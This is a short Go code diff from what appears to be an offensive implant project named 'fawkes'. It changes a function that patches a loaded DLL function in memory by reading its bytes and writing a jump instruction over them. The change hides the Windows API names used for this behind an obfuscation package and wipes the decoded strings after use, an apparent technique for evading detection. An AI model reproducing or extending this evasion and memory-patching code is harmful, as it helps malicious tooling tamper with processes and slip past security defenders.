@@ -10,6 +10,7 @@ import (
 	"syscall"
 	"unsafe"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 )
 
@@ -153,8 +154,12 @@ func PerformAutoPatch(dllName, functionName string, numBytes int) (string, error
 	buffer := make([]byte, bufferSize)
 
 	// Read memory around the function address
-	k32 := syscall.MustLoadDLL("kernel32.dll")
-	readProcessMemory := k32.MustFindProc("ReadProcessMemory")
+	k32Name := obfuscate.Kernel32Dll()
+	defer obfuscate.Zero(k32Name)
+	rpmName := obfuscate.ReadProcessMemory()
+	defer obfuscate.Zero(rpmName)
+	k32 := syscall.MustLoadDLL(k32Name)
+	readProcessMemory := k32.MustFindProc(rpmName)
 
 	currentProcess, _ := syscall.GetCurrentProcess()
 	var bytesRead uintptr
@@ -211,7 +216,9 @@ func PerformAutoPatch(dllName, functionName string, numBytes int) (string, error
 	}
 
 	// Write jump instruction
-	writeProcessMemory := k32.MustFindProc("WriteProcessMemory")
+	wpmName := obfuscate.WriteProcessMemory()
+	defer obfuscate.Zero(wpmName)
+	writeProcessMemory := k32.MustFindProc(wpmName)
 	var bytesWritten uintptr
 
 	ret, _, err = writeProcessMemory.Call(
